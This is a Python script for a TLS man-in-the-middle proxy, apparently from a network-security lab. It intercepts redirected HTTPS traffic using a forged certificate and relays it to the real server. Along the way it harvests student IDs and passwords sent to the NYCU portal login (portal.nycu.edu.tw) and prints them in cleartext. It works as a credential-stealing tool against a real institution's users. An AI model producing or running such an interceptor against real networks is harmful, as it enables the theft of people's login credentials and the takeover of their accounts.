import socket
import ssl
import threading
import re
import time
import os
import sys

LISTEN_IP = "0.0.0.0"  # listen to all network interfaces traffics
LISTEN_PORT = 8080      # MITM agent port (traffics heading to NYCU's network range are redirected to this port)
MITM_CERT = "certificates/host.crt"
MITM_KEY = "certificates/host.key"

def forward_data(source, destination):
    while True:
        try:
            data = source.recv(4096)
            if not data:
                break
            destination.sendall(data)
        except Exception:
            break

def handle_client(client_conn,victim_addr):
    """handle bi-directional HTTPS connection"""

    client_conn.settimeout(3)
    try:
        first_data = b""
        while True:
            try:
                data = client_conn.recv(4096)
                first_data += data
                if not data:
                    break
            except socket.timeout:
                break
            
        # print("first_data: ", first_data)
        match = re.search(r'id=([^&]{1,30})&pwd=([^&]{1,30})&recaptchaToken=.*', first_data.decode())
        if match:
            print(f"ID: {match.group(1)}")
            print(f"Password: {match.group(2)}")
        
        # # parse TLS packet
        # tls_pkt = TLS(first_data)

        # # 顯示解析結果
        # pkt_str = str(tls_pkt.show(dump=True))
        # print(pkt_str)
        
        if b"Host: " in first_data:
            match = re.search(rb"Host:\s*([^\r\n]+)", first_data)
            if match:
                real_server_host = match.group(1)
                # print(f"Extracted Host: {real_server_host.decode()}")
        else:
            real_server_host = "portal.nycu.edu.tw" # default
    except Exception as e:
        print(e)
        real_server_host = "portal.nycu.edu.tw"
    
    real_server_ip = socket.gethostbyname(real_server_host)
    
    # build TLS connection with target server
    try:
        server_conn = socket.create_connection((real_server_ip, 443))
        server_ssl_conn = ssl.wrap_socket(server_conn)
        print(f"TLS Connection Established: [{real_server_ip}:443]")
        server_thread = threading.Thread(target=forward_data, args=(server_ssl_conn, client_conn))
        victim_thread = threading.Thread(target=forward_data, args=(client_conn, server_ssl_conn))
        server_thread.start()
        victim_thread.start()
        server_ssl_conn.sendall(first_data)
        # print("request sent!")
    except Exception as e:
        print(f"[ERROR] Failed to connect to target server: {e}")
        client_conn.close()
        return

    server_thread.join()
    victim_thread.join()

    client_conn.close()
    server_ssl_conn.close()

def start_mitm_proxy():

    victim_ip = sys.argv[1]
    interface = "ens33" # not used actually
    if(len(sys.argv) > 2):
        interface = sys.argv[2]

    """start MITM agent"""
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((LISTEN_IP, LISTEN_PORT))

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=MITM_CERT, keyfile=MITM_KEY)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE  # ask client not to verify

    server_tls_sock = context.wrap_socket(server_sock,server_side=True)

    server_tls_sock.listen(5)
    print(f"[*] MITM Proxy 正在監聽 {LISTEN_IP}:{LISTEN_PORT}")

    while True:
        try:
            client_conn, victim_addr = server_tls_sock.accept()
            # print(victim_addr)
            threading.Thread(target=handle_client, args=(client_conn,victim_addr)).start()
        except KeyboardInterrupt:
            print("Terminating...")
            print("Clearing iptable...")
            os.system("sudo iptables -t nat -F")
            print("Done!")
            break

if __name__ == "__main__":
    start_mitm_proxy()
